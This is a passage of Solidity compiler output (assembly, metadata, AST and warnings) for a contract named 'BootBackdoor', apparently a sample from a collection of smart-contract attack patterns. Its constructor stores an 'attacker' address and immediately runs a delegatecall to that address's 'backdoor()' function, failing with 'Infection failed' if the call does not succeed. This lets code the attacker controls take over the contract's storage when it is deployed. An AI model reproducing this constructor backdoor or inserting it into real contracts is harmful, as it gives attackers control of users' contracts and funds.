											"source": 0,
											"value": "40"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 53,
											"end": 76,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 53,
											"end": 76,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 28,
											"end": 47,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 28,
											"end": 47,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 53,
											"end": 76,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 53,
											"end": 76,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7,
											"end": 133,
											"name": "tag",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 7,
											"end": 133,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 126,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 77,
											"end": 82,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 73,
											"end": 127,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "tag",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 139,
											"end": 235,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 176,
											"end": 183,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 223,
											"end": 228,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 205,
											"end": 229,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 241,
											"end": 359,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 346,
											"end": 351,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "13"
										},
										{
											"begin": 328,
											"end": 352,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "tag",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 328,
											"end": 352,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 323,
											"end": 326,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 316,
											"end": 353,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "tag",
											"source": 1,
											"value": "8"
										},
										{
											"begin": 365,
											"end": 587,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 458,
											"end": 462,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 496,
											"end": 498,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 485,
											"end": 494,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 481,
											"end": 499,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 577,
											"end": 578,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 566,
											"end": 575,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 562,
											"end": 579,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 553,
											"end": 559,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 509,
											"end": 580,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 509,
											"end": 580,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										}
									]
								}
							},
							"sourceList": [
								"B/Boot record infector/Constructor-Based Backdoor.sol",
								"#utility.yul"
							]
						},
						"methodIdentifiers": {
							"attacker()": "48eb76ee",
							"safe()": "186f0354"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.29+commit.ab55807c\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_safe\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_attacker\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attacker\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"safe\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"B/Boot record infector/Constructor-Based Backdoor.sol\":\"BootBackdoor\"},\"evmVersion\":\"cancun\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"B/Boot record infector/Constructor-Based Backdoor.sol\":{\"keccak256\":\"0xced5472c405210684b22181734ba7dff9b87c55def143e87086b4aa86412e36c\",\"urls\":[\"bzz-raw://6616c6cc75649db802409e3217b25fedf9ba60018753d1ca1147835435249ce4\",\"dweb:/ipfs/QmVeuGToeLjufKWVsF5GNeAoqFraFKt6n4YZxJpgnktPfB\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 2,
								"contract": "B/Boot record infector/Constructor-Based Backdoor.sol:BootBackdoor",
								"label": "safe",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 4,
								"contract": "B/Boot record infector/Constructor-Based Backdoor.sol:BootBackdoor",
								"label": "attacker",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n--> B/Boot record infector/Constructor-Based Backdoor.sol\n\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "B/Boot record infector/Constructor-Based Backdoor.sol",
					"start": -1
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "3420",
				"formattedMessage": "Warning: Source file does not specify required compiler version! Consider adding \"pragma solidity ^0.8.29;\"\n--> B/Boot record infector/Constructor-Based Backdoor.sol\n\n",
				"message": "Source file does not specify required compiler version! Consider adding \"pragma solidity ^0.8.29;\"",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "B/Boot record infector/Constructor-Based Backdoor.sol",
					"start": -1
				},
				"type": "Warning"
			}
		],
		"sources": {
			"B/Boot record infector/Constructor-Based Backdoor.sol": {
				"ast": {
					"absolutePath": "B/Boot record infector/Constructor-Based Backdoor.sol",
					"exportedSymbols": {
						"BootBackdoor": [
							36
						]
					},
					"id": 37,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"abstract": false,
							"baseContracts": [],
							"canonicalName": "BootBackdoor",
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 36,
							"linearizedBaseContracts": [
								36
							],
							"name": "BootBackdoor",
							"nameLocation": "9:12:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "186f0354",
									"id": 2,
									"mutability": "mutable",
									"name": "safe",
									"nameLocation": "43:4:0",
									"nodeType": "VariableDeclaration",
									"scope": 36,
									"src": "28:19:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 1,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "28:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "48eb76ee",
									"id": 4,
									"mutability": "mutable",
									"name": "attacker",
									"nameLocation": "68:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 36,
									"src": "53:23:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 3,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "53:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 34,
										"nodeType": "Block",
										"src": "129:251:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 11,
														"name": "safe",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2,
														"src": "139:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 12,
														"name": "_safe",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 6,
														"src": "146:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "139:12:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "139:12:0"
											},
											{
												"expression": {
													"id": 17,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 15,
														"name": "attacker",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 4,
														"src": "161:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 16,
														"name": "_attacker",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "172:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"src": "161:20:0",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 18,
												"nodeType": "ExpressionStatement",
												"src": "161:20:0"
											},
											{
												"assignments": [
													20,
													null
												],
												"declarations": [
													{
														"constant": false,
														"id": 20,
														"mutability": "mutable",
														"name": "ok",
														"nameLocation": "242:2:0",
														"nodeType": "VariableDeclaration",
														"scope": 34,
														"src": "237:7:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 19,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "237:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													},
													null
												],
												"id": 28,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"hexValue": "6261636b646f6f722829",
																	"id": 25,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "string",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "309:12:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_stringliteral_2665f77d28a75cbdd92ce0fe19b8d45dde788c94d006df2636649b3d480c862a",
																		"typeString": "literal_string \"backdoor()\""
																	},
																	"value": "backdoor()"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_stringliteral_2665f77d28a75cbdd92ce0fe19b8d45dde788c94d006df2636649b3d480c862a",
																		"typeString": "literal_string \"backdoor()\""
																	}
																],
																"expression": {
																	"id": 23,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967295,
																	"src": "285:3:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 24,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberLocation": "289:19:0",
																"memberName": "encodeWithSignature",
																"nodeType": "MemberAccess",
																"src": "285:23:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (string memory) pure returns (bytes memory)"
																}
															},
															"id": 26,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "285:37:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"id": 21,
															"name": "attacker",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4,
															"src": "250:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 22,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "259:12:0",
														"memberName": "delegatecall",
														"nodeType": "MemberAccess",
														"src": "250:21:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_baredelegatecall_nonpayable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) returns (bool,bytes memory)"
														}
													},
													"id": 27,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "250:82:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "236:96:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 30,
															"name": "ok",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 20,
															"src": "350:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "496e66656374696f6e206661696c6564",
															"id": 31,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "354:18:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524",
																"typeString": "literal_string \"Infection failed\""
															},
															"value": "Infection failed"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_6386217311e8ee30c5402e861f41362f0f83961fb04666af8a341f5304a18524",
																"typeString": "literal_string \"Infection failed\""
															}
														],
														"id": 29,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "342:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 32,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "342:31:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 33,
												"nodeType": "ExpressionStatement",
												"src": "342:31:0"
											}
										]
									},
									"id": 35,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 6,
												"mutability": "mutable",
												"name": "_safe",
												"nameLocation": "103:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 35,
												"src": "95:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 5,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "95:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 8,
												"mutability": "mutable",
												"name": "_attacker",
												"nameLocation": "118:9:0",
												"nodeType": "VariableDeclaration",
												"scope": 35,
												"src": "110:17:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 7,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "110:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "94:34:0"
									},
									"returnParameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "129:0:0"
									},
									"scope": 36,
									"src": "83:297:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 37,
							"src": "0:382:0",
							"usedErrors": [],
							"usedEvents": []
						}
					],
					"src": "0:383:0"
				},
				"id": 0
			}
		}
	}
}